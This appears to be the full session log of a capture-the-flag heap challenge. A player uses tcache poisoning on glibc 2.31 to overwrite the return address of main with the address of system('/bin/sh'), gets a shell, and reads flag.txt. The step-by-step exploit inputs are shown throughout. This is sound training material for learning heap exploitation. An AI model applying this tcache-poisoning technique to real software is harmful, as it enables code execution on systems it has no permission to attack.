@@ -1,0 +1,298 @@
+Do arbitrary write using tcache bin.
+ldd (Ubuntu GLIBC 2.31-0ubuntu9.2) 2.31
+malloc is fixed at size 0x10
+
+system('/bin/sh') at >0x56352ee5e342
+Return address of main at >0x7fff09c33fe8
+
+Bin count >0
+
+!! Segfault may happen when fd isn't readable address
+fd >>>
+           ↑
+Will be allocated for the next malloc
+
+[0] : Not Allocated
+[1] : Not Allocated
+[2] : Not Allocated
+[3] : Not Allocated
+[4] : Not Allocated
+---------------
+1. malloc
+2. free
+3. write
+4. exit
+>1
+Where? >0
+
+Do arbitrary write using tcache bin.
+ldd (Ubuntu GLIBC 2.31-0ubuntu9.2) 2.31
+malloc is fixed at size 0x10
+
+system('/bin/sh') at >0x56352ee5e342
+Return address of main at >0x7fff09c33fe8
+
+Bin count >0
+
+!! Segfault may happen when fd isn't readable address
+fd >>>
+           ↑
+Will be allocated for the next malloc
+
+[0] : Allocated Chunk
+Chunk at>0x563530d7d2c0
+Data :
+[1] : Not Allocated
+[2] : Not Allocated
+[3] : Not Allocated
+[4] : Not Allocated
+---------------
+1. malloc
+2. free
+3. write
+4. exit
+>1
+Where? >1
+
+Do arbitrary write using tcache bin.
+ldd (Ubuntu GLIBC 2.31-0ubuntu9.2) 2.31
+malloc is fixed at size 0x10
+
+system('/bin/sh') at >0x56352ee5e342
+Return address of main at >0x7fff09c33fe8
+
+Bin count >0
+
+!! Segfault may happen when fd isn't readable address
+fd >>>
+           ↑
+Will be allocated for the next malloc
+
+[0] : Allocated Chunk
+Chunk at>0x563530d7d2c0
+Data :
+[1] : Allocated Chunk
+Chunk at>0x563530d7d2e0
+Data :
+[2] : Not Allocated
+[3] : Not Allocated
+[4] : Not Allocated
+---------------
+1. malloc
+2. free
+3. write
+4. exit
+>2
+Where? >0
+
+Do arbitrary write using tcache bin.
+ldd (Ubuntu GLIBC 2.31-0ubuntu9.2) 2.31
+malloc is fixed at size 0x10
+
+system('/bin/sh') at >0x56352ee5e342
+Return address of main at >0x7fff09c33fe8
+
+Bin count >1
+
+!! Segfault may happen when fd isn't readable address
+fd >>> 0x563530d7d2c0
+           ↑
+Will be allocated for the next malloc
+
+[0] : Free Chunk
+Chunk at>0x563530d7d2c0
+fd : 0x0
+[1] : Allocated Chunk
+Chunk at>0x563530d7d2e0
+Data :
+[2] : Not Allocated
+[3] : Not Allocated
+[4] : Not Allocated
+---------------
+1. malloc
+2. free
+3. write
+4. exit
+>2
+Where? >1
+
+Do arbitrary write using tcache bin.
+ldd (Ubuntu GLIBC 2.31-0ubuntu9.2) 2.31
+malloc is fixed at size 0x10
+
+system('/bin/sh') at >0x56352ee5e342
+Return address of main at >0x7fff09c33fe8
+
+Bin count >2
+
+!! Segfault may happen when fd isn't readable address
+fd >>> 0x563530d7d2e0 0x563530d7d2c0
+           ↑
+Will be allocated for the next malloc
+
+[0] : Free Chunk
+Chunk at>0x563530d7d2c0
+fd : 0x0
+[1] : Free Chunk
+Chunk at>0x563530d7d2e0
+fd : 0x563530d7d2c0
+[2] : Not Allocated
+[3] : Not Allocated
+[4] : Not Allocated
+---------------
+1. malloc
+2. free
+3. write
+4. exit
+>3
+What will happen if you can write fd of free chunk?
+Where? >1
+What? ( ex: 0x123456 )>0x7fff09c33fe8
+
+Do arbitrary write using tcache bin.
+ldd (Ubuntu GLIBC 2.31-0ubuntu9.2) 2.31
+malloc is fixed at size 0x10
+
+system('/bin/sh') at >0x56352ee5e342
+Return address of main at >0x7fff09c33fe8
+
+Bin count >2
+
+!! Segfault may happen when fd isn't readable address
+fd >>> 0x563530d7d2e0 0x7fff09c33fe8
+           ↑
+Will be allocated for the next malloc
+
+[0] : Free Chunk
+Chunk at>0x563530d7d2c0
+fd : 0x0
+[1] : Free Chunk
+Chunk at>0x563530d7d2e0
+fd : 0x7fff09c33fe8
+[2] : Not Allocated
+[3] : Not Allocated
+[4] : Not Allocated
+---------------
+1. malloc
+2. free
+3. write
+4. exit
+>1
+Where? >2
+
+Do arbitrary write using tcache bin.
+ldd (Ubuntu GLIBC 2.31-0ubuntu9.2) 2.31
+malloc is fixed at size 0x10
+
+system('/bin/sh') at >0x56352ee5e342
+Return address of main at >0x7fff09c33fe8
+
+Bin count >1
+
+!! Segfault may happen when fd isn't readable address
+fd >>> 0x7fff09c33fe8
+           ↑
+Will be allocated for the next malloc
+
+[0] : Free Chunk
+Chunk at>0x563530d7d2c0
+fd : 0x0
+[1] : Allocated Chunk
+Chunk at>0x563530d7d2e0
+Data :
+[2] : Allocated Chunk
+Chunk at>0x563530d7d2e0
+Data :
+[3] : Not Allocated
+[4] : Not Allocated
+---------------
+1. malloc
+2. free
+3. write
+4. exit
+>1
+Where? >3
+
+Do arbitrary write using tcache bin.
+ldd (Ubuntu GLIBC 2.31-0ubuntu9.2) 2.31
+malloc is fixed at size 0x10
+
+system('/bin/sh') at >0x56352ee5e342
+Return address of main at >0x7fff09c33fe8
+
+Bin count >0
+
+!! Segfault may happen when fd isn't readable address
+fd >>>
+           ↑
+Will be allocated for the next malloc
+
+[0] : Free Chunk
+Chunk at>0x563530d7d2c0
+fd : 0x0
+[1] : Allocated Chunk
+Chunk at>0x563530d7d2e0
+Data :
+[2] : Allocated Chunk
+Chunk at>0x563530d7d2e0
+Data :
+[3] : Allocated Chunk
+Chunk at>0x7fff09c33fe8
+Data :
+[4] : Not Allocated
+---------------
+1. malloc
+2. free
+3. write
+4. exit
+>3
+What will happen if you can write fd of free chunk?
+Where? >3
+What? ( ex: 0x123456 )>0x56352ee5e342
+
+Do arbitrary write using tcache bin.
+ldd (Ubuntu GLIBC 2.31-0ubuntu9.2) 2.31
+malloc is fixed at size 0x10
+
+system('/bin/sh') at >0x56352ee5e342
+Return address of main at >0x7fff09c33fe8
+
+Bin count >0
+
+!! Segfault may happen when fd isn't readable address
+fd >>>
+           ↑
+Will be allocated for the next malloc
+
+[0] : Free Chunk
+Chunk at>0x563530d7d2c0
+fd : 0x0
+[1] : Allocated Chunk
+Chunk at>0x563530d7d2e0
+Data :
+[2] : Allocated Chunk
+Chunk at>0x563530d7d2e0
+Data :
+[3] : Allocated Chunk
+Chunk at>0x7fff09c33fe8
+Data : B竇.5V
+[4] : Not Allocated
+---------------
+1. malloc
+2. free
+3. write
+4. exit
+>4
+
+ls -al
+total 36
+drwxr-xr-x 1 root pwn   4096 Nov  5 07:48 .
+drwxr-xr-x 1 root root  4096 Nov  5 07:24 ..
+-r-xr-x--- 1 root pwn  17472 Nov  5 07:46 chall
+-r--r----- 1 root pwn     31 Nov  5 07:07 flag.txt
+-r-xr-x--- 1 root pwn     35 Nov  5 07:07 redir.sh
+cat flag.txt
+FLAG{This_is_Hint_for_the_diva}
+exit
+Segmentation fault (core dumped)
+
